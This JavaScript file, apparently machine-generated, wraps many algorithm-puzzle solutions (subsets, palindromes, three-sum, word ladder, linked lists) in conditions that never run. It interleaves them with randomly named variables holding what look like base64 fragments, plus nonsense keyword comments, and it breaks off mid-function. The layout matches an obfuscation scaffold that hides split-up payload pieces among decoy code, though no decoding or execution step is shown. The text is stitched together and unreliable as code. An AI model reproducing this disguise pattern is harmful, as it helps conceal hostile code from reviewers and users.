    var gdamomopqdu = 'Qogkt';
    var imfac = 'SUNBZ0lD';
if (null === 2) {
    /**
Given a collection of integers that might contain duplicates, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,2], a solution is:

[
  [2],
  [1],
  [1,2,2],
  [2,2],
  [1,2],
  []
]
*/

/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsetsWithDup = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        // skip duplicates
        if (i > start && nums[i] === nums[i - 1]) {
            continue;
        }
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var kjyttidpbb = 'JYTwbqCk';
    var feseajmjxvrthn = 'QWdJ';
    var obtivt = 'btmosCeI';
    var eofrx = 'Q0I3SUd';
    var zqhovxrig = 'cLhpHPNsx';
    var auijjwg = 'OMG';
    var fmmjirpuljj = 'sHNiHiNzgZ';
if (typeof document === 'undefined') {
    /**
Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.

For example,
"A man, a plan, a canal: Panama" is a palindrome.
"race a car" is not a palindrome.

Note:
Have you consider that the string might be empty? This is a good question to ask during an interview.

For the purpose of this problem, we define empty string as valid palindrome.

 * @param {string} s
 * @return {boolean}
 */
var isPalindrome = function(s) {
    var len = s.length,
        str,
        i;
    
    if (len === 0) {
        return true;
    }
    
    str = s.replace(/\W/g, '').toLowerCase();
    len = str.length;
    
    if (len === 0) {
        return true;
    }
    
    for (i = 0; i < len/2; i++) {
         if (str.charAt(i) !== str.charAt(len - 1 - i)) {
             return false;
         }
    }
    return true;
};

}

    var mwbcdfr = 'NtdzZJ';
    var lomzwsbwryk = 'YAgocW';
    var bbxbivcnfjck = 'SFJ5ZFdVc0';
    var bmrjrw = 'MPhDmh';
    var aniondiihcg = 'lHdG';
if (94 > 196) {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var aduolfg = 'QaUIED';
if ('j' === 'V') {
    /**
Follow up for "Unique Paths":

Now consider if some obstacles are added to the grids. How many unique paths would there be?

An obstacle and empty space is marked as 1 and 0 respectively in the grid.

For example,
There is one obstacle in the middle of a 3x3 grid as illustrated below.

[
  [0,0,0],
  [0,1,0],
  [0,0,0]
]
The total number of unique paths is 2.

Note: m and n will be at most 100.


*/
/**
 * @param {number[][]} obstacle
 * @return {number}
 */
var uniquePathsWithObstacles = function(obstacle) {
    var rLen = obstacle.length,
        matrix = [],
        cLen,
        i,
        j;
        
    if (rLen === 0) {
        return 0;    
    }
    
    cLen = obstacle[0].length;
    
    if (obstacle[0][0] === 1) {
        return 0;
    }
    
    for (i = 0; i < rLen; i++) {
        matrix.push(new Array(cLen));
    }
    
    matrix[0][0] = 1;
    for (i = 1; i < cLen; i++) {
        matrix[0][i] = (obstacle[0][i] || !matrix[0][i - 1])? 0 : 1; 
    }
    
    for (i = 1; i < rLen; i++) {
        matrix[i][0] = (obstacle[i][0] || !matrix[i - 1][0])? 0 : 1;
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            if (obstacle[i][j]) {
                matrix[i][j] = 0;
            } else {
                matrix[i][j] = matrix[i - 1][j] + matrix[i][j - 1];
            }
        }
    }
    
    return matrix[rLen - 1][cLen - 1];
};

}

    var gkosbqxctcpzfn = 'xlVU52Wkd';
if (9 instanceof String) {
    /**
Given a non-empty array of integers, return the k most frequent elements.

For example,
Given [1,1,1,2,2,3] and k = 2, return [1,2].

Note: 
You may assume k is always valid, 1 ≤ k ≤ number of unique elements.
Your algorithm's time complexity must be better than O(n log n), where n is the array's size.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {number[]}
 * 
 *  Build a array of list to be buckets with length 1 to sort.
 */
var topKFrequent = function(nums, k) {
    let len = nums.length;
    const bucket = {};
    const freqs = [];
    let result = [];
    
    nums.forEach((num) => {
        if (bucket[num] === undefined) {
            bucket[num] = 1;
        } else {
            bucket[num]++;
        }
    });
    
    Object.keys(bucket).forEach((num) => {
        const freq = bucket[num];
        num = parseInt(num);
        
        if (freqs[freq] === undefined) {
            freqs[freq] = [num];
        } else {
            freqs[freq].push(num);
        }
    });
    
    let j = 0;
    for (let i = freqs.length; i >= 0; i--) {
        if (freqs[i] !== undefined) {
            len = freqs[i].length;
            
            for (let m = 0; m < len; m++) {
                if (j === k) {
                    break;
                }
                
                result.push(freqs[i][m]);
                j++;
            }
            
            if (j === k) {
                break;
            }
        }
    }
    
    return result;
};

}

    var mqbcfo = 'jejtl';
// value async array variable number script array loop code
    var fbuvvh = 'jEgMFKh';
    var efubykfvqevj = 'VNklEY3lJS';
if (10 === 14) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        max = 0,
        cur;
        
    if (length === 0) {
        return 0;
    }
    low = prices[0];
    high = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > high) {
            high = cur;
        }else if (cur < low) {
            //need to reset low and high in order to make sure you need to buy before you sell
            low = cur;
            high = cur;
        }
        if (high - low > max) {
            max = high - low;
        }
    }
    return max;
};

}

    var ooddblkeywuv = 'cEdwMsL';
    var xiaqxbkjeyunr = 'DBzSUM4d';
if (null === 1) {
    /**
Given a nested list of integers, implement an iterator to flatten it.

Each element is either an integer, or a list -- whose elements may also be integers or other lists.

Example 1:
Given the list [[1,1],2,[1,1]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].

Example 2:
Given the list [1,[4,[6]]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6].
*/
/**
 * // This is the interface that allows for creating nested lists.
 * // You should not implement it, or speculate about its implementation
 * function NestedInteger() {
 *
 *     Return true if this NestedInteger holds a single integer, rather than a nested list.
 *     @return {boolean}
 *     this.isInteger = function() {
 *         ...
 *     };
 *
 *     Return the single integer that this NestedInteger holds, if it holds a single integer
 *     Return null if this NestedInteger holds a nested list
 *     @return {integer}
 *     this.getInteger = function() {
 *         ...
 *     };
 *
 *     Return the nested list that this NestedInteger holds, if it holds a nested list
 *     Return null if this NestedInteger holds a single integer
 *     @return {NestedInteger[]}
 *     this.getList = function() {
 *         ...
 *     };
 * };
 */
/**
 * @constructor
 * @param {NestedInteger[]} nestedList
 */
var NestedIterator = function(nestedList) {
    this.stack = nestedList.reverse();
};


/**
 * @this NestedIterator
 * @returns {boolean}
 */
NestedIterator.prototype.hasNext = function() {
    var next,
        i;
    
    while (this.stack.length > 0) {
        next = this.stack[this.stack.length - 1];
        
        if (next.isInteger()) {
            return true;
        }
        
        this.stack.pop();
        
        for (i = next.getList().length - 1; i >= 0; i--) {
            this.stack.push(next.getList()[i]);
        }
    }
    
    return false;
};

/**
 * @this NestedIterator
 * @returns {integer}
 */
NestedIterator.prototype.next = function() {
    return this.stack.pop();
};

/**
 * Your NestedIterator will be called like this:
 * var i = new NestedIterator(nestedList), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var zrzlgzbgqn = 'uuiVX';
    var sjitjdfyovwfm = 'klFTjBjb';
if (2 instanceof String) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var nhnbdvsye = 'iNNpps';
if (!true && 0) {
    /**

*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var lengthOfLIS = function(nums) {
    var len = nums.length,
        arr = [],
        i,
        j,
        max = 1;
    
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        arr[i] = 1;
        for (j = 0; j < i; j++) {
            if ((nums[i] > nums[j]) && (arr[j] + 1 > arr[i])) {
                arr[i] = arr[j] + 1;
            }
            
            max = Math.max(max, arr[i]);

        }
    }
    
    return max;
};

}

    var gvxznmddxmjhth = 'XdyU0FvZ0l';
    var zzbwvnjl = 'lVncosBnS';
    var jjzcmw = 'DQWdJQ0F';
    var ptkudvo = 'BiNBYiLI';
    var kzenrzdqy = 'nSUhzZ2J';
    var hnnmdooi = 'bokLXc';
if (82 > 125) {
    /**
Reverse a singly linked list.

click to show more hints.

Hint:
A linked list can be reversed either iteratively or recursively. Could you implement both?
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseList = function(head) {
    var cur = head,
        next;
    
    head = null;
    
    while(cur) {
        next = cur.next;
        cur.next = head;
        
        if (next) {
            head = cur;
            cur = next;
        } else {
            return cur;   
        }
    }
    
    return null;
};

// recursive

var reverseList = function(head) {
    if (!head) {
        return null;
    }
    
    if (!head.next) {
        return head;
    }
    
    var newHead = reverseList(head.next);
    
    head.next.next = head;
    head.next = null;
    
    return newHead;
};

}

    var gwhpmwraf = 'XVjBZV';
if (87 > 186) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var cbsnog = 'MjvOcgCbxB';
    var ctreaagrflqkj = 'G9nZEhKM';
    var mucrhriodir = 'ukvKrYfP';
if (0.32 && false) {
    /**
Related to question Excel Sheet Column Title

Given a column title as appear in an Excel sheet, return its corresponding column number.

For example:

    A -> 1
    B -> 2
    C -> 3
    ...
    Z -> 26
    AA -> 27
    AB -> 28 

 * @param {string} s
 * @return {number} Return column number
 */
var titleToNumber = function(s) {
    var len = s.length,
        i,
        result = 0;
    for (i = 0; i < len; i++) {
        result += Math.pow(26, len - i - 1) * (s.charAt(i).charCodeAt() - 'A'.charCodeAt() + 1);
    }
    return result;
};

}

    var wgqnsnpxms = 'VpTd2dZV3g';
    var jjoptc = 'uctCvA';
    var jgnenydiiqxgds = 'wT2lCM';
    var gbkwxnqaxnpj = 'NEmoBcYLAA';
    var khgqriours = 'GNuVmxMQ0';
if (!true && 1) {
    /**
Follow up for H-Index: What if the citations array is sorted in ascending order? Could you optimize your algorithm?

Hint:

Expected runtime complexity is in O(log n) and the input is sorted.
*/
/**
 * @param {number[]} citations
 * @return {number}
 */
var hIndex = function(citations) {
    var len = citations.length,
        start = 0,
        end = len - 1,
        mid;
    
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        
        if (citations[mid] === len - mid) {
            return len - mid;
        }
        
        if (citations[mid] > len - mid) {
            end = mid - 1;
        } else {
            start = mid + 1;
        }
    }
    
    return len - start;
};

}

    var vsxtdlbmn = 'qhHVF';
    var nyxkgt = 'JyWl';
    var tcqeumyufwi = 'IRxoN';
    var xixpzzyyyyiafcf = 'hsRGI';
if ('true' === true) {
    /**
Given a string, find the length of the longest substring without repeating characters.

Examples:

Given "abcabcbb", the answer is "abc", which the length is 3.

Given "bbbbb", the answer is "b", with the length of 1.

Given "pwwkew", the answer is "wke", with the length of 3. Note that the answer must be a substring, "pwke" is a subsequence and not a substring.
*/
/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLongestSubstring = function(s) {
    var len = s.length,
        max = 0,
        chars = new Set(),
        leftBound = 0,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (chars.has(ch)) {
            // find the repeating character
            while (leftBound < i && s.charAt(leftBound) !== ch) {
                chars.delete(s.charAt(leftBound));
                leftBound++;
            }
            
            leftBound++;
        } else {
            chars.add(ch);
            max = Math.max(max, i - leftBound + 1);
        }
    }
    
    return max;
};

}

    var oskspepoc = 'dqhwB';
    var dryjeempetxp = 'yUmxPaUEz';
    var vgcdtayncwer = 'sxqqvsDx';
    var cuyfojzjiskkmw = 'TXlCOUxDQX';
    var tudrkrziazrx = 'YnebqykL';
if (3 instanceof String) {
    /**
Convert a non-negative integer to its english words representation. Given input is guaranteed to be less than 231 - 1.

For example,
123 -> "One Hundred Twenty Three"
12345 -> "Twelve Thousand Three Hundred Forty Five"
1234567 -> "One Million Two Hundred Thirty Four Thousand Five Hundred Sixty Seven"
Hint:

Did you see a pattern in dividing the number into chunk of words? For example, 123 and 123000.
Group the number by thousands (3 digits). You can write a helper function that takes a number less than 1000 and convert just that chunk to words.
There are many edge cases. What are some good test cases? Does your code work with input such as 0? Or 1000010? (middle chunk is zero and should not be printed out)
*/
/**
 * @param {number} num
 * @return {string}
 */
var numberToWords = function(num) {
    const belowTen = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine'];
    const belowTwenty = ['Ten', 'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen'];
    const belowHundred = ['Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];
    
    function toWordsHelper(num) {
        let str;
        
        if (num < 10) {
            str = belowTen[num] + ' ';
        } else if (num < 20) {
            str = belowTwenty[num - 10] + ' ';
        } else if (num < 100) {
            str = belowHundred[parseInt(num / 10) - 2] + ' ' + toWordsHelper(num % 10);
        } else if (num < 1000) {
            str = belowTen[parseInt(num / 100)] + ' Hundred ' + toWordsHelper(num % 100);
        } else if (num < 1000000) {
            str = toWordsHelper(parseInt(num / 1000)) + ' Thousand ' + toWordsHelper(num % 1000);
        } else if (num < 1000000000) {
            str = toWordsHelper(parseInt(num / 1000000)) + ' Million ' + toWordsHelper(num % 1000000);
        } else {
            str = toWordsHelper(parseInt(num / 1000000000)) + ' Billion ' + toWordsHelper(num % 1000000000);
        }
        
        return str.trim();
    }
    
    let result = toWordsHelper(num);
    
    if (result === '') {
        return 'Zero';
    }
    
    return result;
};

}

    var dyblkaxsoa = 'ZMeU';
    var lnywfy = 'gmjQupo';
if (0.95 && false) {
    /**
Write a function that takes a string as input and reverse only the vowels of a string.

Example 1:
Given s = "hello", return "holle".

Example 2:
Given s = "leetcode", return "leotcede".
*/
/**
 * @param {string} s
 * @return {string}
 */
var reverseVowels = function(s) {
    var len = s.length,
        result = s.split(''),
        vowelSet = new Set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']),
        indice = [],
        arr = [],
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = result[i];
        
        if (vowelSet.has(ch)) {
            arr.push(ch);
            indice.push(i);
        }
    }
    
    for (i = 0; i < indice.length; i++) {
        result[indice[i]] = arr.pop();
    }
    
    return result.join('');
};

}

    var szifydnjecruof = 'JEYldRclF';
    var tikrrijt = 'yzHXcP';
// return
    var wsvrostonzic = 'myymlDKQMe';
    var wnvnmhagsekvvya = 'XeDBLMGt';
    var gnhxcy = 'NheHzJ';
    var cblhvmayvyv = 'nYjI0';
    var ledliex = 'MaFE';
    var xkrycioblzc = 'Z2JXRmpUMU';
    var nosiltzli = 'KZqzF';
if (100 > 128) {
    /**
You are climbing a stair case. It takes n steps to reach to the top.

Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 * @param {number} n
 * @return {number}
 */
var climbStairs = function(n) {
    var arr = [],
        i;
    
    arr[0] = 0;
    arr[1] = 1;
    arr[2] = 2;
    
    for(i = 3; i <= n; i++) {
        arr[i] = arr[i - 1] + arr[i - 2];
    }
    return arr[n];
};

}

// import constant script define define value sblbig function await import compile
if (32 > 183) {
    /**
There is a new alien language which uses the latin alphabet. However, the order among letters are unknown to you. You receive a list of words from the dictionary, where words are sorted lexicographically by the rules of this new language. Derive the order of letters in this language.

For example,
Given the following words in dictionary,

[
  "wrt",
  "wrf",
  "er",
  "ett",
  "rftt"
]
The correct order is: "wertf".

Note:
You may assume all letters are in lowercase.
If the order is invalid, return an empty string.
There may be multiple valid order of letters, return any one of them is fine.
*/
/**
 * @param {string[]} words
 * @return {string}
 */
var alienOrder = function(words) {
    if (words.length === 0) {
        return '';
    }
    
    const len = words.length;
    let map = {}; // value is the prerequisite of key
    let charPreReqCount = {};
    let i;
    let queue = [];
    let result = [];
    let hasCycle = false;
    
    for (i = 0; i < len; i++) {
        const chars = words[i].split('');
        
        let j = 0;
        
        for (j = 0; j < chars.length; j++) {
            if (!map[chars[j]]) {
                map[chars[j]] = [];
                charPreReqCount[chars[j]] = 0;
            }
        }

        if (i === 0 || words[i] === words[i - 1]) {
            continue;
        }
        
        const cur = words[i];
        const prev = words[i - 1];
        j = 0;
        
        while(j < cur.length && j < prev.length && cur.charAt(j) === prev.charAt(j)) {
            j++;
        }
        
        if (j < prev.length && map[prev.charAt(j)].indexOf(cur.charAt(j)) === -1) {
            map[prev.charAt(j)].push(cur.charAt(j));
            
            charPreReqCount[cur.charAt(j)]++;
        }
    }
    
    Object.keys(charPreReqCount).forEach(char => {
        if (charPreReqCount[char] === 0) {
            queue.push(char);
        }
    });
    
    while(queue.length > 0) {
        const char = queue.shift();
        
        result.push(char);
        
        for (i = 0; i < map[char].length; i++) {
            charPreReqCount[map[char][i]]--;
            
            if (charPreReqCount[map[char][i]] === 0) {
                queue.push(map[char][i]);
            }
        }
    }
    
    // detect cycle
    Object.keys(charPreReqCount).forEach(function(char) {
        if (charPreReqCount[char] !== 0) {
            hasCycle = true;
        }
    });
    
    return hasCycle ? '' : result.join('');
};

}

    var fcnxfmi = 'mkmmrVm';
    var wzfccgd = '1LSUNBZ0lD';
    var pltiok = 'uCvUmNQdx';
    var hyynctaogdx = 'QWd';
    var ftulnmemig = 'QbvZnkOx';
if ('n' === 'E') {
    /**
Given an integer matrix, find the length of the longest increasing path.

From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed).

Example 1:

nums = [
  [9,9,4],
  [6,6,8],
  [2,1,1]
]
Return 4
The longest increasing path is [1, 2, 6, 9].

Example 2:

nums = [
  [3,4,5],
  [3,2,6],
  [2,2,1]
]
Return 4
The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.
*/
/**
 * @param {number[][]} matrix
 * @return {number}
 */
var longestIncreasingPath = function(matrix) {
    var dp = [], // dp[i][j] the longest increasing path starting from matrix[i][j]
        rLen = matrix.length,
        cLen,
        i,
        j,
        max = 0;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            max = Math.max(max, dfs(i, j, rLen, cLen, matrix, dp));
        }
    }
    
    return max;
};

function dfs(i, j, rLen, cLen, matrix, dp) {
    if (dp[i][j] !== 0) {
        return dp[i][j];
    }
    
    var dx = [1, 0, 0, -1],
        dy = [0, 1, -1, 0],
        max = 1,
        m,
        len,
        x,
        y;
        
    for (m = 0; m < 4; m++) {
        x = dx[m] + i;
        y = dy[m] + j;
        
        if (x >= 0 && y >= 0 && x < rLen && y < cLen && matrix[x][y] > matrix[i][j]) {
            max = Math.max(max, 1 + dfs(x, y, rLen, cLen, matrix, dp));
        }
    }
    
    dp[i][j] = max;
    
    return max;
}

}

    var xdrnlvlyc = 'JQ0I3SUc';
    var jzrlqgnstb = 'KpBCEVameD';
// string define
    var gavizp = 'BJHxbq';
    var sseyidx = 'xbGRHRTZJ';
    var aeztsudj = 'byoi';
// mjgw array number
    var tzmrrre = 'LpDQPoAcbA';
    var htuxnxlfhvvaef = 'SFJ5ZF';
    var brsanp = 'KSEcX';
if (4 instanceof String) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var wyulygwm = 'dVc0lHR';
    var ioaopfzrml = 'hcPQb';
    var ktmddfhxavwmru = 'nNkRG9nZEh';
    var fivqubxwbdrl = 'DMvKEg';
if (0.79 && false) {
    /**
Given a linked list, return the node where the cycle begins. If there is no cycle, return null.

Follow up:
Can you solve it without using extra space?

 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var detectCycle = function(head) {
    if (head === null) {
        return null;
    }
    var slow = head,
        fast = head,
        met = false;
    
    while (fast !== null && fast.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow === fast) {
            met = true;
            break;
        }
    }
    
    if (met) {
        fast = head;
        while (fast !== slow) {
            fast = fast.next;
            slow = slow.next;
        }
        return fast;
    } else {
        return null;
    }
};

}

// urbixv compile number debug number loop string code loop import array function
if (3 === 17) {
    /**
Given two words (beginWord and endWord), and a dictionary's word list, find the length of shortest transformation sequence from beginWord to endWord, such that:

Only one letter can be changed at a time
Each intermediate word must exist in the word list
For example,

Given:
beginWord = "hit"
endWord = "cog"
wordList = ["hot","dot","dog","lot","log"]
As one shortest transformation is "hit" -> "hot" -> "dot" -> "dog" -> "cog",
return its length 5.

Note:
Return 0 if there is no such transformation sequence.
All words have the same length.
All words contain only lowercase alphabetic characters.
*/
/**
 * @param {string} beginWord
 * @param {string} endWord
 * @param {Set} wordList
 *   Note: wordList is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {number}
 */
var ladderLength = function(beginWord, endWord, wordList) {
    var visit = {},
        len = beginWord.length,
        queue = [],
        charArr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'],
        curNode,
        curStr,
        tempStr,
        tempNode,
        i,
        j;
    
    curNode = new node(beginWord, 1);
    visit[curNode.str] = true;
    queue.push(curNode);
    

    while (queue.length > 0) {
        curNode = queue.shift();
        curStr = curNode.str;
        for (i = 0; i < len; i++) {
            for (j = 0; j < 26; j++) {
                if (charArr[j] === curStr.charAt(i)) {
                    continue;
                }
                
                tempStr = curStr.substring(0, i) + charArr[j] + curStr.substring(i + 1, len);
                
                if (tempStr === endWord) {
                    return curNode.step + 1;
                }
                
                if (wordList.has(tempStr) && !visit.hasOwnProperty(tempStr)) {
                    visit[tempStr] = true;
                    tempNode = new node(tempStr, curNode.step + 1);
                    queue.push(tempNode);
                }
            }
        }
    }
        
    return 0;
};

function node(str, step) {
    this.str = str;
    this.step = step;
}

}

    var saqmtvm = 'Sptw';
    var xyujjbnjre = 'KMVpTd';
    var icwfyfytblbt = 'ooeMPNFqeY';
if (5 === 19) {
    /**
Merge k sorted linked lists and return it as one sorted list. Analyze and describe its complexity.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode[]} lists
 * @return {ListNode}
 */
var mergeKLists = function(lists) {
    var len = lists.length;
    
    if (len === 0) {
        return null;
    }
    
    if (len === 1) {
        return lists[0];
    }
        
    return mergeHelper(lists, 0, len - 1);
};

function mergeHelper(lists, start, end) {
    if (start === end) {
        return lists[start];
    }
    
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        left,
        right;
    
    left = mergeHelper(lists, start, mid);
    right = mergeHelper(lists, mid + 1, end);
    
    return mergeTwoLists(left, right);
}

function mergeTwoLists(left, right) {
    if (!left) {
        return right;
    }
    
    if (!right) {
        return left;
    }
    
    var dummy = new ListNode(0),
        prev = dummy,
        node1 = left,
        node2 = right;
    
    while (node1 && node2) {
        if (node1.val < node2.val) {
            prev.next = node1;
            node1 = node1.next;
        } else {
            prev.next = node2;
            node2 = node2.next;
        }
        
        prev = prev.next;
    }
    
    if (node1) {
        prev.next = node1;
    }
    
    if (node2) {
        prev.next = node2;
    }
    
    return dummy.next;
}

}

    var hughicelvjfry = '2dhMlY1UT';
if (9 instanceof String) {
    /**
Write a program to find the node at which the intersection of two singly linked lists begins.


For example, the following two linked lists:

A:          a1 → a2
                   ↘
                     c1 → c2 → c3
                   ↗            
B:     b1 → b2 → b3
begin to intersect at node c1.


Notes:

If the two linked lists have no intersection at all, return null.
The linked lists must retain their original structure after the function returns.
You may assume there are no cycles anywhere in the entire linked structure.
Your code should preferably run in O(n) time and use only O(1) memory.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

// better solution

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} headA
 * @param {ListNode} headB
 * @return {ListNode}
 */
var getIntersectionNode = function(headA, headB) {
    let nodeA = headA;
    let nodeB = headB;
    
    while (nodeA !== nodeB) {
        nodeA = (nodeA === null) ? headB : nodeA.next;
        nodeB = (nodeB === null) ? headA : nodeB.next;
    }
    
    return nodeA;
};

/**
 * @param {ListNode} headA
 * @param {ListNode} headB
 * @return {ListNode}
 */
var getIntersectionNode = function(headA, headB) {
    var nodeA = headA,
        nodeB = headB,
        isALonger,
        i = 0;
    
    if (headA === headB) {
        return headA;
    }
    
    if (headA === null || headB === null) {
        return null;
    }
    
    while (nodeA.next && nodeB.next) {
        nodeA = nodeA.next;
        nodeB = nodeB.next;
    }
    
    while (nodeA.next) {
        nodeA = nodeA.next;
        isALonger = true;
        i++;
    }
    
    while (nodeB.next) {
        nodeB = nodeB.next;
        isALonger = false;
        i++;
    }
    
    if (nodeA !== nodeB) {
        return null;
    }
    
    nodeA = headA;
    nodeB = headB;
    
    while (i > 0) {
        if (isALonger) {
            nodeA = nodeA.next;
        } else {
            nodeB = nodeB.next;
        }
        
        i--;
    }
    
    while (nodeA !== nodeB) {
        nodeA = nodeA.next;
        nodeB = nodeB.next;
    }
    
    return nodeA;
};

}

    var pedbxqm = 'IgtjPvi';
if (!true && 0) {
    /**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} l1
 * @param {ListNode} l2
 * @return {ListNode}
 */
var addTwoNumbers = function(l1, l2) {
    var val = 0,
        newHead,
        newTail,
        node;
    
    if (!l1) {
        return l2;
    }
    
    if (!l2) {
        return l1;
    }
    
    while (l1 && l2) {
        val += l1.val + l2.val;
        node = new ListNode(val % 10);
        
        if (newHead) {
            newTail.next = node;
